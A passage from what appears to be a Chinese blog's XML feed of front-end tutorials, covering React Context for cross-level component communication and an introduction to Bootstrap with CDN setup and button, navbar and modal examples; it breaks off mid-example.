class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="11-5-跨层级组件通信"><a href="#11-5-跨层级组件通信" class="headerlink" title="11.5 跨层级组件通信"></a>11.5 跨层级组件通信</h2><p>使用Context机制跨层级组件通信。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-23%2017.52.00.png" style="zoom:50%;"><p>实现步骤：</p><ol><li>使用createContext方法创建一个上下文对象Ctx。</li><li>在顶层组件（App）中通过 Ctx.Provider 组件提供数据。</li><li>在底层组件（B）中通过 useContext 钩子函数获取消费数据。</li></ol><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// App -&gt; A -&gt; B</span><span class="token keyword">import</span> <span class="token punctuation">{</span> createContext<span class="token punctuation">,</span> useContext <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token comment">// 1. createContext方法创建一个上下文对象</span><span class="token keyword">const</span> MsgContext <span class="token operator">=</span> <span class="token function">createContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// 2. 在顶层组件 通过Provider组件提供数据</span><span class="token comment">// 3. 在底层组件 通过useContext钩子函数使用数据</span><span class="token keyword">function</span> <span class="token constant">A</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is A component      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">B</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token constant">B</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> msg <span class="token operator">=</span> <span class="token function">useContext</span><span class="token punctuation">(</span>MsgContext<span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is B compnent,</span><span class="token punctuation">{</span>msg<span class="token punctuation">}</span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> msg <span class="token operator">=</span> <span class="token string">'this is app msg'</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">MsgContext.Provider</span></span> <span class="token attr-name">value</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>msg<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        this is App        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">A</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">MsgContext.Provider</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只要存在顶层和底层的关系都可以使用Context来进行通信。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-23%2017.53.00.png" style="zoom:50%;"><h1 id="常用的第三方库"><a href="#常用的第三方库" class="headerlink" title="常用的第三方库"></a>常用的第三方库</h1><p>动态控制类型名：classnames</p><p>生成唯一的随机数：uuid ，地址：<a href="https://github.com/uuidjs/uuid">https://github.com/uuidjs/uuid</a></p><p>生成固定格式的时间：dayjs ，地址：<a href="https://day.js.org/zh-CN/">https://day.js.org/zh-CN/</a></p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ul><li><a href="https://www.runoob.com/react/react-jsx.html">https://www.runoob.com/react/react-jsx.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端开发 </tag>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bootstrap</title>
      <link href="/2024/12/09/qian-hou-duan-kai-fa/bootstrap/"/>
      <url>/2024/12/09/qian-hou-duan-kai-fa/bootstrap/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Bootstrap-简介"><a href="#一、Bootstrap-简介" class="headerlink" title="一、Bootstrap 简介"></a>一、Bootstrap 简介</h1><p><strong>Bootstrap</strong> 是一个功能强大、响应式、开源的前端框架，用于快速开发现代化网站和 Web 应用程序。它由 Twitter 的 Mark Otto 和 Jacob Thornton 创建，最初发布于 2011 年，目前由社区和开发者积极维护。</p><h1 id="二、核心特点"><a href="#二、核心特点" class="headerlink" title="二、核心特点"></a>二、核心特点</h1><h2 id="2-1-响应式设计"><a href="#2-1-响应式设计" class="headerlink" title="2.1 响应式设计"></a>2.1 <strong>响应式设计</strong></h2><p>Bootstrap 提供了基于 <strong>12 列网格系统</strong> 的布局工具，使页面能够适配不同尺寸的屏幕设备（如手机、平板、桌面）。</p><blockquote><ul><li><h3 id="何为响应式设计？"><a href="#何为响应式设计？" class="headerlink" title="何为响应式设计？"></a>何为响应式设计？</h3></li></ul><p><strong>响应式设计</strong>（Responsive Web Design，简称 RWD）是一种 Web 开发技术，旨在使网页能够根据用户设备的屏幕大小、分辨率和方向自动调整布局和内容，从而提供一致且友好的用户体验。</p><p>响应式设计的目标是<strong>一套代码适配多种设备</strong>，无论用户使用的是桌面、平板还是手机，页面都能清晰易用，避免缩放、横向滚动等不便。</p><h3 id="响应式设计的特点"><a href="#响应式设计的特点" class="headerlink" title="响应式设计的特点"></a>响应式设计的特点</h3><ol><li><strong>自动适配屏幕尺寸</strong><ul><li>页面布局、字体大小、图片比例等会根据设备变化自动调整。</li></ul></li><li><strong>提升用户体验</strong><ul><li>无需用户手动缩放或横向滚动，内容更易读、操作更便捷。</li></ul></li><li><strong>节省开发时间</strong><ul><li>相较于为每种设备开发单独的页面，响应式设计一次开发即可适配多端。</li></ul></li></ol></blockquote><blockquote><ul><li><h3 id="何为SEO？"><a href="#何为SEO？" class="headerlink" title="何为SEO？"></a>何为SEO？</h3></li></ul><p><strong>SEO</strong> 是 <strong>Search Engine Optimization</strong> 的缩写，中文称为<strong>搜索引擎优化</strong>。它是一种通过优化网站内容、结构和外部链接等方式，提高网站在搜索引擎中的排名，从而增加网站自然流量的技术和策略。</p><p>SEO 的目标是让网站更容易被搜索引擎抓取、理解和推荐，从而在用户搜索相关关键词时，能优先展示在搜索结果页面（SERP，Search Engine Results Page）靠前的位置。</p></blockquote><h2 id="2-2-预制样式和组件"><a href="#2-2-预制样式和组件" class="headerlink" title="2.2 预制样式和组件"></a>2.2 <strong>预制样式和组件</strong></h2><p>内置大量预制样式和 UI 组件，能快速构建现代化页面：</p><ul><li>常见的 CSS 样式：按钮、表单、排版等。</li><li>UI 组件：导航栏、模态框、卡片、标签页等。</li></ul><h2 id="2-3-移动优先"><a href="#2-3-移动优先" class="headerlink" title="2.3 移动优先"></a>2.3 <strong>移动优先</strong></h2><p>默认采用“移动优先”设计理念，确保页面在移动设备上的体验优先，同时适配更大的屏幕。</p><h2 id="2-4-强大的扩展能力"><a href="#2-4-强大的扩展能力" class="headerlink" title="2.4 强大的扩展能力"></a>2.4 <strong>强大的扩展能力</strong></h2><p>支持自定义和扩展，开发者可以在其基础上开发自己的样式或功能。</p><h2 id="2-5-基于-HTML、CSS-和-JavaScript"><a href="#2-5-基于-HTML、CSS-和-JavaScript" class="headerlink" title="2.5 基于 HTML、CSS 和 JavaScript"></a>2.5 <strong>基于 HTML、CSS 和 JavaScript</strong></h2><p>Bootstrap 提供的功能主要基于 HTML 和 CSS，同时也内置了许多交互功能，依赖于其自带的 JavaScript 或 jQuery。</p><h2 id="2-6-丰富的文档"><a href="#2-6-丰富的文档" class="headerlink" title="2.6 丰富的文档"></a>2.6 <strong>丰富的文档</strong></h2><p>Bootstrap 的文档详细、易懂，提供大量示例代码和用法说明，便于开发者快速上手。</p><h1 id="三、使用方法"><a href="#三、使用方法" class="headerlink" title="三、使用方法"></a>三、使用方法</h1><h2 id="3-1-引入方式"><a href="#3-1-引入方式" class="headerlink" title="3.1 引入方式"></a>3.1 <strong>引入方式</strong></h2><p>Bootstrap 提供了多种方式来引入，包括 CDN 和本地安装。</p><p><strong>通过 CDN 引入</strong>：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Bootstrap 示例<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 引入 Bootstrap CSS --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>通过 npm 安装</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> bootstrap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-2-基本示例"><a href="#3-2-基本示例" class="headerlink" title="3.2 基本示例"></a>3.2 <strong>基本示例</strong></h2><p><strong>创建一个响应式页面布局</strong>：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Bootstrap 网格示例<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-md-4<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>列 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-md-4<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>列 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-md-4<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>列 3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="四、常见的组件示例"><a href="#四、常见的组件示例" class="headerlink" title="四、常见的组件示例"></a>四、常见的组件示例</h1><h2 id="4-1-按钮"><a href="#4-1-按钮" class="headerlink" title="4.1 按钮"></a>4.1 按钮</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>主按钮<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-secondary<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>次按钮<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4-2-导航栏"><a href="#4-2-导航栏" class="headerlink" title="4.2 导航栏"></a>4.2 导航栏</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar navbar-expand-lg navbar-light bg-light<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container-fluid<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-brand<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Logo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-toggler<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-toggle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>collapse<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#navbarNav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-toggler-icon<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>collapse navbar-collapse<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbarNav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-nav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-item<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-link active<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>主页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-item<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-link<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>功能<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-item<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-link<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>联系<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-3-模态框"><a href="#4-3-模态框" class="headerlink" title="4.3 模态框"></a>4.3 模态框</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 触发按钮 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-toggle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#exampleModal<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    打开模态框<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 模态框 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal fade<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>exampleModal<span class="token punctuation">"</span></span> <span class="token attr-name">tabindex</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-dialog<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-content<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-header<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-title<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>模态框标题<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn-close<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-dismiss</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>modal-body<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                这是模态框的内容。            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span 